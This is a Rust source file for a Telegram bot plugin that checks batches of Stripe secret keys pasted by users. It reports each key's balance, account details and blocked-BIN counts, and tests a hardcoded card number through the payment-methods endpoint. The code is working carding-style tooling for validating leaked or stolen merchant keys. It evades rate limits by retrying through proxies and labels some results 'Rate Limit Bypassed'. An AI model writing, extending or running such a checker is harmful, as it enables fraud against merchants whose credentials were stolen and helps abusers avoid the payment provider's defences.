use crate::config::get_config;
use crate::plugins::helpers::utils::sk_utils::{create_client as create_sk_client, extract_proxy};
use crate::handle_database_error;
use crate::logging::{get_logger, LoggerHandle};
use crate::plugin_handler::*;
use crate::plugins::helpers::*;
use crate::safe_database_operation;
use chrono::Utc;
use regex::Regex;
use reqwest;
use serde_json;
use teloxide::payloads::{EditMessageTextSetters, SendMessageSetters};
use teloxide::types::{ChatKind, Message, ParseMode};
use teloxide::{prelude::Requester, Bot};
use teloxide_plugin::TeloxidePlugin;

lazy_static::lazy_static! {
    static ref LOGGER: std::sync::Arc<LoggerHandle> = {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(get_logger("SKCheckerPlugin"))
        })
    };
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum CheckMode {
    Full,
    Base,
}

#[TeloxidePlugin(commands = [
    "sk",
    "sk@KissShotChkBot",
    "msk",
    "msk@KissShotChkBot",
    "skbase",
    "skbase@KissShotChkBot",
    "mskbase",
    "mskbase@KissShotChkBot"
])]
pub struct SKCheckerPlugin;

impl SKCheckerPlugin {
    pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
        self.sk_checker(bot, message, msg).await
    }

    fn resolve_check_mode(&self, message: &Message) -> CheckMode {
        let command = message
            .text()
            .and_then(|text| text.split_whitespace().next())
            .unwrap_or("/sk")
            .split('@')
            .next()
            .unwrap_or("/sk")
            .to_ascii_lowercase();

        if command == "/skbase" || command == "/mskbase" {
            CheckMode::Base
        } else {
            CheckMode::Full
        }
    }

    fn create_client(&self, proxy_url: Option<&str>) -> Result<reqwest::Client, String> {
        create_sk_client(proxy_url)
    }

    fn parse_proxy_and_text(&self, text: &str) -> (Option<String>, String) {
        let proxy_pattern = Regex::new(r"(?i)\bproxy\s+(\S+)").unwrap();
        let mut proxy_url = None;
        let mut cleaned = text.to_string();

        if let Some(caps) = proxy_pattern.captures(&text) {
            let raw = caps.get(1).map(|m| m.as_str()).unwrap_or("");
            proxy_url = extract_proxy(raw).or_else(|| {
                crate::plugins::helpers::utils::sk_utils::normalize_proxy(raw).ok()
            });
            cleaned = proxy_pattern.replace_all(&text, " ").to_string();
        }

        (proxy_url, cleaned.trim().to_string())
    }

    fn extract_sk(&self, text: &str) -> Vec<String> {
        let pattern = Regex::new(r"sk_(live|test)_\S+").unwrap();
        pattern
            .find_iter(text)
            .map(|m| m.as_str().to_string())
            .collect()
    }

    fn mask_sk(&self, sk: &str, is_group: bool) -> String {
        if is_group && sk.len() > 12 {
            let start = &sk[..14.min(sk.len())];
            let end = &sk[sk.len().saturating_sub(6)..];
            let middle = "x".repeat(sk.len().saturating_sub(20));
            format!("{}{}{}", start, middle, end)
        } else {
            sk.to_string()
        }
    }

    async fn fetch_balance(
        &self,
        client: &reqwest::Client,
        sk: &str,
    ) -> Result<serde_json::Value, String> {
        let response = client
            .get("https://api.stripe.com/v1/balance")
            .header("Authorization", format!("Bearer {}", sk))
            .send()
            .await
            .map_err(|e| format!("Balance request failed: {}", e))?;

        let status = response.status();
        let body = response
            .text()
            .await
            .map_err(|e| format!("Failed to read balance response: {}", e))?;

        if !status.is_success() {
            return Err(body);
        }

        serde_json::from_str(&body).map_err(|e| format!("Invalid balance JSON: {}", e))
    }

    async fn fetch_account(
        &self,
        client: &reqwest::Client,
        sk: &str,
    ) -> Option<serde_json::Value> {
        match client
            .get("https://api.stripe.com/v1/account")
            .header("Authorization", format!("Bearer {}", sk))
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() => resp.json().await.ok(),
            Ok(resp) => {
                let _ = LOGGER
                    .error(&format!("Account request returned status {}", resp.status()))
                    .await;
                None
            }
            Err(e) => {
                let _ = LOGGER
                    .error(&format!("Account request failed: {}", e))
                    .await;
                None
            }
        }
    }

    fn format_balance_info(&self, balance_data: &serde_json::Value) -> (f64, String) {
        let balance = balance_data
            .get("available")
            .and_then(|a| a.get(0))
            .and_then(|b| b.get("amount"))
            .and_then(|a| a.as_u64())
            .unwrap_or(0) as f64;
        let currency = balance_data
            .get("available")
            .and_then(|a| a.get(0))
            .and_then(|b| b.get("currency"))
            .and_then(|c| c.as_str())
            .unwrap_or("usd")
            .to_uppercase();
        (balance / 100.0, currency)
    }

    async fn fetch_blocked_bins(&self, client: &reqwest::Client, sk: &str) -> u64 {
        match client
            .get("https://api.stripe.com/v1/radar/value_lists")
            .header("Authorization", format!("Bearer {}", sk))
            .send()
            .await
        {
            Ok(resp) => match resp.json::<serde_json::Value>().await {
                Ok(data) => data
                    .get("data")
                    .and_then(|d| d.get(8))
                    .and_then(|item| item.get("list_items"))
                    .and_then(|items| items.get("total_count"))
                    .and_then(|count| count.as_u64())
                    .unwrap_or(0),
                Err(_) => 0,
            },
            Err(_) => 0,
        }
    }

    async fn check_base(
        &self,
        sk: &str,
        display_sk: &str,
        proxy_url: Option<&str>,
        using_proxy: bool,
    ) -> String {
        let client = match self.create_client(proxy_url) {
            Ok(client) => client,
            Err(e) => {
                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> ERROR ❌\n\
                     <b>Reason:</b> {}",
                    display_sk, e
                );
            }
        };

        let balance_data = match self.fetch_balance(&client, sk).await {
            Ok(data) => data,
            Err(body) => {
                let error_msg = serde_json::from_str::<serde_json::Value>(&body)
                    .ok()
                    .and_then(|data| {
                        data.get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .map(|s| s.to_string())
                    })
                    .unwrap_or_else(|| "Invalid or dead key".to_string());

                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> {}\n\
                     <b>Check Type:</b> Base\n\
                     <b>Proxy:</b> {}",
                    display_sk,
                    error_msg,
                    if using_proxy { "On" } else { "Off" }
                );
            }
        };

        let (balance, currency) = self.format_balance_info(&balance_data);
        let account = self.fetch_account(&client, sk).await;
        let account_id = account
            .as_ref()
            .and_then(|a| a.get("id"))
            .and_then(|id| id.as_str())
            .unwrap_or("N/A");
        let business = account
            .as_ref()
            .and_then(|a| a.get("business_profile"))
            .and_then(|b| b.get("name"))
            .and_then(|n| n.as_str())
            .unwrap_or("N/A");
        let country = account
            .as_ref()
            .and_then(|a| a.get("country"))
            .and_then(|c| c.as_str())
            .unwrap_or("N/A");

        format!(
            "<b>Secret Key:</b> {}\n\
             <b>Status:</b> Live Key ✅ (Base Check)\n\
             <b>Balance:</b> {:.2}\n\
             <b>Currency:</b> {}\n\
             <b>Account ID:</b> {}\n\
             <b>Business:</b> {}\n\
             <b>Country:</b> {}\n\
             <b>Check Type:</b> Base\n\
             <b>Proxy:</b> {}",
            display_sk,
            balance,
            currency,
            account_id,
            business,
            country,
            if using_proxy { "On" } else { "Off" }
        )
    }

    async fn check_full(
        &self,
        sk: &str,
        display_sk: &str,
        proxy_url: Option<&str>,
        using_proxy: bool,
    ) -> String {
        let client = match self.create_client(proxy_url) {
            Ok(client) => client,
            Err(e) => {
                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> ERROR ❌\n\
                     <b>Reason:</b> {}",
                    display_sk, e
                );
            }
        };

        let pm_response = match client
            .post("https://api.stripe.com/v1/payment_methods")
            .header("Authorization", format!("Bearer {}", sk))
            .form(&[
                ("type", "card"),
                ("card[number]", "4403934238397462"),
                ("card[exp_month]", "12"),
                ("card[exp_year]", "2026"),
                ("card[cvc]", "582"),
            ])
            .send()
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                let _ = LOGGER
                    .error(&format!("Error in payment method request: {}", e))
                    .await;
                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> ERROR ❌",
                    display_sk
                );
            }
        };

        let balance_data = match self.fetch_balance(&client, sk).await {
            Ok(data) => data,
            Err(_) => serde_json::Value::Null,
        };

        let blocked_bins = self.fetch_blocked_bins(&client, sk).await;
        let pm_text = pm_response.text().await.unwrap_or_default();
        let (balance, currency) = self.format_balance_info(&balance_data);

        if pm_text.contains("\"id\": \"pm_") || pm_text.contains("\"id\":\"pm_") {
            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> Live Key ✅\n\
                 <b>Balance:</b> {:.2}\n\
                 <b>Currency:</b> {}\n\
                 <b>Blocked Bins:</b> {}\n\
                 <b>Check Type:</b> Full\n\
                 <b>Proxy:</b> {}",
                display_sk,
                balance,
                currency,
                blocked_bins,
                if using_proxy { "On" } else { "Off" }
            )
        } else if pm_text.contains("rate_limit") {
            self.handle_rate_limited_key(sk, display_sk, proxy_url, using_proxy, balance, currency, blocked_bins)
                .await
        } else {
            let error_msg = serde_json::from_str::<serde_json::Value>(&pm_text)
                .ok()
                .and_then(|data| {
                    data.get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .map(|s| s.to_string())
                })
                .unwrap_or_else(|| "Unknown error".to_string());

            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> {}\n\
                 <b>Check Type:</b> Full\n\
                 <b>Proxy:</b> {}",
                display_sk,
                error_msg,
                if using_proxy { "On" } else { "Off" }
            )
        }
    }

    async fn handle_rate_limited_key(
        &self,
        sk: &str,
        display_sk: &str,
        proxy_url: Option<&str>,
        using_proxy: bool,
        balance: f64,
        currency: String,
        blocked_bins: u64,
    ) -> String {
        if !using_proxy {
            if let Ok(config) = get_config() {
                if let Some(config_proxy) = &config.config.proxy.proxy {
                    if !config_proxy.trim().is_empty() {
                        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                        let retry_result = self
                            .retry_full_with_proxy(sk, display_sk, config_proxy.as_str())
                            .await;
                        if !retry_result.contains("rate_limit") && !retry_result.contains("RATE LIMITED") {
                            return retry_result;
                        }
                    }
                }
            }

            if let Some(user_proxy) = proxy_url {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                let retry_result = self.retry_full_with_proxy(sk, display_sk, user_proxy).await;
                if !retry_result.contains("rate_limit") && !retry_result.contains("RATE LIMITED") {
                    return retry_result;
                }
            }
        }

        let base_fallback = self
            .check_base(sk, display_sk, proxy_url, using_proxy)
            .await;

        if base_fallback.contains("Live Key ✅") {
            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> Live Key ✅ (Rate Limit Bypassed)\n\
                 <b>Balance:</b> {:.2}\n\
                 <b>Currency:</b> {}\n\
                 <b>Blocked Bins:</b> {}\n\
                 <b>Check Type:</b> Full → Base Fallback\n\
                 <b>Proxy:</b> {}\n\
                 <b>Note:</b> PM endpoint rate limited; validated via balance/account.",
                display_sk, balance, currency, blocked_bins, if using_proxy { "On" } else { "Off" }
            )
        } else {
            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> RATE LIMITED KEY ⚠️\n\
                 <b>Balance:</b> {:.2}\n\
                 <b>Currency:</b> {}\n\
                 <b>Blocked Bins:</b> {}\n\
                 <b>Check Type:</b> Full\n\
                 <b>Proxy:</b> {}",
                display_sk, balance, currency, blocked_bins, if using_proxy { "On" } else { "Off" }
            )
        }
    }

    async fn retry_full_with_proxy(&self, sk: &str, display_sk: &str, proxy: &str) -> String {
        let client = match self.create_client(Some(proxy)) {
            Ok(client) => client,
            Err(e) => {
                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> ERROR ❌\n\
                     <b>Reason:</b> {}",
                    display_sk, e
                );
            }
        };

        let pm_response = match client
            .post("https://api.stripe.com/v1/payment_methods")
            .header("Authorization", format!("Bearer {}", sk))
            .form(&[
                ("type", "card"),
                ("card[number]", "4403934238397462"),
                ("card[exp_month]", "12"),
                ("card[exp_year]", "2026"),
                ("card[cvc]", "582"),
            ])
            .send()
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                return format!(
                    "<b>Secret Key:</b> {}\n\
                     <b>Status:</b> ERROR ❌\n\
                     <b>Reason:</b> {}",
                    display_sk, e
                );
            }
        };

        let balance_data = match self.fetch_balance(&client, sk).await {
            Ok(data) => data,
            Err(_) => serde_json::Value::Null,
        };
        let blocked_bins = self.fetch_blocked_bins(&client, sk).await;
        let pm_text = pm_response.text().await.unwrap_or_default();
        let (balance, currency) = self.format_balance_info(&balance_data);

        if pm_text.contains("\"id\": \"pm_") || pm_text.contains("\"id\":\"pm_") {
            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> Live Key ✅ (Proxy Retry)\n\
                 <b>Balance:</b> {:.2}\n\
                 <b>Currency:</b> {}\n\
                 <b>Blocked Bins:</b> {}\n\
                 <b>Check Type:</b> Full\n\
                 <b>Proxy:</b> On",
                display_sk, balance, currency, blocked_bins
            )
        } else if pm_text.contains("rate_limit") {
            "rate_limit".to_string()
        } else {
            let error_msg = serde_json::from_str::<serde_json::Value>(&pm_text)
                .ok()
                .and_then(|data| {
                    data.get("error")
                        .and_then(|e| e.get("message"))
                        .and_then(|m| m.as_str())
                        .map(|s| s.to_string())
                })
                .unwrap_or_else(|| "Unknown error".to_string());
            format!(
                "<b>Secret Key:</b> {}\n\
                 <b>Status:</b> {}\n\
                 <b>Check Type:</b> Full\n\
                 <b>Proxy:</b> On",
                display_sk, error_msg
            )
        }
    }

    async fn check_single_sk(
        &self,
        sk: &str,
        display_sk: &str,
        mode: CheckMode,
        proxy_url: Option<&str>,
    ) -> String {
        let using_proxy = proxy_url.is_some()
            || get_config()
                .ok()
                .and_then(|cfg| cfg.config.proxy.proxy.clone())
                .filter(|p| !p.trim().is_empty())
                .is_some();

        match mode {
            CheckMode::Base => {
                self.check_base(sk, display_sk, proxy_url, using_proxy)
                    .await
            }
            CheckMode::Full => {
                self.check_full(sk, display_sk, proxy_url, using_proxy)
                    .await
            }
        }
    }

    pub async fn sk_checker(&self, bot: &Bot, message: &Message, msg: &str) {
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let user_id = message.from.as_ref().map(|u| u.id.0).unwrap_or(0) as i64;
        let first_name = message
            .from
            .as_ref()
            .map(|user| user.first_name.clone())
            .unwrap_or_else(|| "User".to_string());
        let check_mode = self.resolve_check_mode(message);
        let mode_label = if check_mode == CheckMode::Base {
            "Base"
        } else {
            "Full"
        };

        let sent_msg = bot
            .send_message(message.chat.id, "<b>Please wait...</b>")
            .parse_mode(ParseMode::Html)
            .await
            .unwrap();

        if !check_registration(user_id).await {
            let reply = format!(
                "<b>Secret Key Checking Failed ❌</b>\n\n\
                 <b>Reason:</b> You are not registered.\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        if check_banned(user_id).await {
            let reply = format!(
                "<b>Secret Key Checking Failed ❌</b>\n\n\
                 <b>Reason:</b> You are banned from using this bot.\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let mut text = String::new();

        if let Some(document) = message.document() {
            let _ = document;
            let _ = LOGGER
                .info("Document attachment detected but not processed yet")
                .await;
        }

        if msg.len() > 20 {
            text = msg.to_string();
        } else if let Some(reply) = message.reply_to_message() {
            if let Some(reply_text) = reply.text() {
                if reply_text.len() > 20 {
                    text = reply_text.to_string();
                }
            }
        }

        let (proxy_url, cleaned_text) = self.parse_proxy_and_text(&text);
        if !cleaned_text.is_empty() {
            text = cleaned_text;
        }

        if text.is_empty() {
            let reply = format!(
                "<b>Secret Key Checking Failed ❌</b>\n\n\
                 <b>Reason:</b> No file or text found!\n\
                 <b>Usage:</b>\n\
                 • <code>/sk sk_live_...</code> — Full check\n\
                 • <code>/skbase sk_live_...</code> — Base check (no PM, bypasses rate limit)\n\
                 • <code>/sk proxy http://host:port sk_live_...</code> — Check via proxy\n\
                 • Reply to a message containing SKs\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let sks = self.extract_sk(&text);
        if sks.is_empty() {
            let reply = format!(
                "<b>Secret Key Checking Failed ❌</b>\n\n\
                 <b>Reason:</b> No SK found!\n\
                 <b>Timestamp:</b> {}",
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let max_sk = 20;
        if sks.len() > max_sk {
            let reply = format!(
                "<b>Secret Key Checking Information ℹ️</b>\n\n\
                 <b>Reason:</b> You can only check {} Secret Keys at once.\n\
                 <b>Found:</b> {}\n\
                 <b>Timestamp:</b> {}",
                max_sk,
                sks.len(),
                timestamp
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let is_group = matches!(message.chat.kind, ChatKind::Public(_));
        let mut results = Vec::new();
        let mut checked_count = 0;
        let proxy_ref = proxy_url.as_deref();

        for sk in &sks {
            if checked_count >= max_sk {
                break;
            }
            checked_count += 1;
            let display_sk = self.mask_sk(sk, is_group);

            let progress_msg = format!(
                "<b>Secret Key Checking...</b>\n\n\
                 <b>Mode:</b> {}\n\
                 <b>Progress:</b> {}/{}\n\n\
                 {}",
                mode_label,
                checked_count,
                sks.len(),
                results.join("\n\n")
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, &progress_msg)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();

            let result = self
                .check_single_sk(sk, &display_sk, check_mode, proxy_ref)
                .await;
            results.push(result);
        }

        let user = handle_database_error!(
            bot,
            message,
            safe_fetch_user(user_id).await,
            "Database Operation"
        );
        let role = user
            .as_ref()
            .map(|u| u.status.clone())
            .unwrap_or_else(|| "Free".to_string());
        let user_id_for_link = message.from.as_ref().map(|u| u.id.0).unwrap_or(0);
        let end_text = format!(
            "<b>Requested By:</b> <a href=\"tg://user?id={}\">{}</a> [{}]\n\
            <b>Timestamp:</b> {}",
            user_id_for_link,
            first_name,
            format!("{}{}", &role[..1].to_uppercase(), &role[1..].to_lowercase()),
            timestamp
        );

        let final_msg = format!(
            "<b>Secret Key Checking Successful ✅</b>\n\n\
             <b>Mode:</b> {}\n\
             <b>Checked:</b> {}\n\
             <b>Total:</b> {}\n\n\
             {}\n\n\
             {}",
            mode_label,
            checked_count,
            sks.len(),
            results.join("\n\n"),
            end_text
        );
        bot.edit_message_text(message.chat.id, sent_msg.id, final_msg)
            .parse_mode(ParseMode::Html)
            .await
            .unwrap();
    }
}
